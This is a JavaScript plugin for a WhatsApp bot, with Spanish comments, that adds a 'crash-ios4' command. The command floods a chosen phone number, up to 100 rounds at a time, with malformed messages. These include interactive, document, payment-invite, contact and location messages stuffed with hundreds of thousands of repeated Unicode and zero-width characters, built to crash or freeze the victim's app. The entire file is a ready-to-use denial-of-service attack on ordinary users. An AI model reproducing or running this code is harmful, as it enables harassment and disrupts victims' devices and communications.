
module.exports = {
    name: 'crash-ios4',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones necesarias del 'context'
        const { isBot, isCreator, q, reply, prefix, candList, sleep, generateWAMessageFromContent, proto } = context;

        // 2. Definimos la función de apoyo 'invisível_trava_status' dentro del plugin
        async function crashGalaxy(target) {
        let xios = "𑇂𑆵𑆴𑆿".repeat(333333) + "\u200B".repeat(333333) + "ހށނރ".repeat(333333)
        
        await generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
        message: {
        interactiveMessage: {
        header: {
        documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/json",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
        fileLength: "999999999999",
        pageCount: 7.554679297577082e+23,
        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
        fileName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏",
        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
        directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1715880173"
        },
        hasMediaAttachment: true
        },
        body: {
        text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + xios
        },
        nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
        name: "galaxy_message",
        flow_action: "navigate",
        flow_action_payload: { screen: "CTZ_SCREEN" },
        flow_cta: "🍏",
        flow_id: "UNDEFINEDONTOP",
        flow_message_version: "9.903",
        flow_token: "UNDEFINEDONTOP"
        })
        },
        contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
        groupMentions: [{
        groupJid: "1@newsletter",
        groupSubject: "UNDEFINEDONTOP"
                    }]
                  }
                }
              }
            }
          }), { userJid: target });
        
        await conn.relayMessage(
        target,
        {
        paymentInviteMessage: {
        serviceType: "APPLEPAY",
        expiryTimestamp: Date.now() + 1814400000
              }
            },
            {
              participant: { jid: target }
            }
          );
        
        await conn.relayMessage(target, {
        contactMessage: {
        displayName: "𝐏𝐎𝐒𝐄𝐭𝐎𝐍 𝐕𝟏" + "𑇂𑆵𑆴𑆿".repeat(60000),
        vcard: `BEGIN:VCARD
        VERSION:3.0
        N:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
        FN:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
        item1.TEL;waid=526421147692:526421147692
        item1.X-ABLabel:Click here to chat
        item2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj
        item2.X-ABLabel:YouTube
        item3.URL:INSTA: instagram.com/principeazul2.0
        item3.X-ABLabel:GitHub
        item4.ADR:;;Brasil, AM, SP;;;;
        item4.X-ABLabel:Region
        END:VCARD`,
        contextInfo: {
        forwardingScore: 2,
        isForwarded: true,
        isFromMe: true,
        externalAdenviar: {
        mediaType: 1,
        previewType: "NONE",
        sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj"
                }
              }
            }
          }, {
            quoted: m
          });
        
        await conn.relayMessage(target, {
        locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
        }, {
        participant: { jid: target }
        });
        }
        // 3. Lógica principal del comando mejorada
        if (!isBot && !isCreator) return;
        if (!q) return reply(`Formato incorrecto.\n*Ejemplo:* ${prefix}crash-ios4 +5939xxxxxxxx,5`);

        let targetNumber;
        let cantidad = 1; // Default si solo se pone el número
        const limite = 100; // Límite máximo para este comando

        if (q.includes(',')) {
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const cantidadSolicitada = parseInt(parts[1].trim());

            if (!isNaN(cantidadSolicitada) && cantidadSolicitada > 0) {
                cantidad = Math.min(cantidadSolicitada, limite);
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, '');
        }

        if (!targetNumber) return reply('El número no es válido.');

        const target = targetNumber + "@s.whatsapp.net";

        if (candList.includes(target)) {
            await reply(`Nel, con el owner no`);
            await conn.sendMessage("593969533280@s.whatsapp.net", {
                text: `User *${m.sender}* intentó usar atraso-new en ${target}.`
            });
            return;
        }

        await reply(`> Iniciando envío a ${targetNumber}\n*Cantidad* : \`${cantidad}\``);

        for (let i = 0; i < cantidad; i++) {
            console.log(`[+] Enviando set de crash-ios#${i + 1} a ${targetNumber}`);
            // El bucle original enviaba 3 mensajes. Mantenemos esa lógica por cada "cantidad".
            await crashGalaxy(target);
        }

        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
};